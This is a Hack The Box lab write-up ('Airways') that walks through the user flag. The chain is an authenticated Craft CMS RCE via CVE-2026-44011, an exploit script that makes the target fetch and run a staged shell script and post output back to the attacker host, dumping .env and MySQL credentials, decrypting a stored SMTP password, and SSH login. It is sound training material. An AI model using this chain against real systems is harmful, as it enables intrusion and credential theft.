HTB Airways — User Flag Writeup
Attack Chain Summary
WiFi Sniffing → Jenny's Credentials → Craft CMS RCE (CVE-2026-44011)
→ www-data shell → MySQL credential dump → Encrypted password decrypt
→ SSH as aporter → user.txt
Step 1 — Craft CMS RCE (CVE-2026-44011)
Target: http://10.13.37.10/index.php?p=admin
Credentials obtained via WiFi sniffing: jenny / Fl1ghtDeck2026!
Affected version: Craft CMS 5.9.8 (within advisory range 5.0.0–5.9.17)

The vulnerability is an authenticated RCE in the element-search controller. The condition parameter is passed unsanitised to createCondition(), which constructs nested field layouts from attacker-supplied arrays. A crafted payload abuses Yii2's AttributeTypecastBehavior to invoke an arbitrary callable (Psy\Readline\Hoa\ConsoleProcessus::execute) with attacker-controlled input.

The exploit script stages a shell script on a local HTTP listener, tricks the target into fetching and executing it, then receives the command output via an HTTP POST callback.

python3 craft_rce.py \
  -b "http://10.13.37.10" \
  -P "index.php?p=admin" \
  -u jenny -p "Fl1ghtDeck2026!" \
  -c "id" \
  -H 10.13.37.182
Result:

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Step 2 — Enumerating the Database
2a — Extract .env for DB credentials
-c "find /var/www -name '.env' 2>/dev/null | xargs cat"
Key values recovered:

Variable	Value
CRAFT_SECURITY_KEY	IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DB_USER	craftuser
CRAFT_DB_PASSWORD	CraftDB_pw_2026
CRAFT_DB_DATABASE	craft
2b — List tables, spot custom ones
-c "mysql -u craftuser -pCraftDB_pw_2026 craft -e 'SHOW TABLES;'"
Notable non-standard tables: htbairways_settings, miles_members

Step 3 — Finding the Username aporter
-c "mysql -u craftuser -pCraftDB_pw_2026 craft -e 'SELECT * FROM htbairways_settings;'"
id	name	value
1	mailRelayPassword	u0E7OgbB… (encrypted blob)
2	mailRelayHost	mail.htbairways.htb
3	mailRelayPort	587
4	mailRelayUser	aporter
The htbairways_settings table stores SMTP relay configuration for the application's mail system. The mailRelayUser field directly reveals the system username aporter — a mail relay account that maps to an OS user.

Step 4 — Decrypting the Mail Relay Password
Craft CMS encrypts secrets at rest using Yii2's Security::encryptByKey() with CRAFT_SECURITY_KEY as the key. The same PHP class can decrypt it on the server.

# Write decrypt script to /tmp/dec.php via RCE
-c "cat > /tmp/dec.php << 'PHPEOF'
<?php
require '/var/www/portal/vendor/autoload.php';
\$sec = new \yii\base\Security();
\$key = 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr';
\$enc = base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=');
echo \$sec->decryptByKey(\$enc, \$key) . PHP_EOL;
PHPEOF"

# Execute it
-c "php /tmp/dec.php"
Decrypted password: Skyp0rt_Relay!26

Key insight: The SMTP relay password was reused as aporter's OS/SSH password — a common misconfiguration in CTF and real-world environments alike.

Step 5 — SSH as aporter → User Flag
ssh aporter@10.13.37.10
# password: Skyp0rt_Relay!26

cat ~/user.txt
User flag:

<flag here>
Credentials & Artifacts Recovered
Account	Credential	Source
jenny (Craft CMS)	Fl1ghtDeck2026!	WiFi sniff
craftuser (MySQL)	CraftDB_pw_2026	.env file
aporter (SSH)	Skyp0rt_Relay!26	Decrypted from DB
Key Techniques
CVE-2026-44011 — Authenticated Craft CMS RCE via unsanitised condition parameter and Yii2 behavior deserialization
Two-stage HTTP callback — Exfiltrate command output without a reverse shell
Custom table enumeration — SHOW TABLES to find app-specific data beyond standard Craft schema
Craft security key decryption — Using Yii2's own Security class on the server to unwrap encryptByKey()-protected secrets
Credential reuse — SMTP relay password → OS SSH password
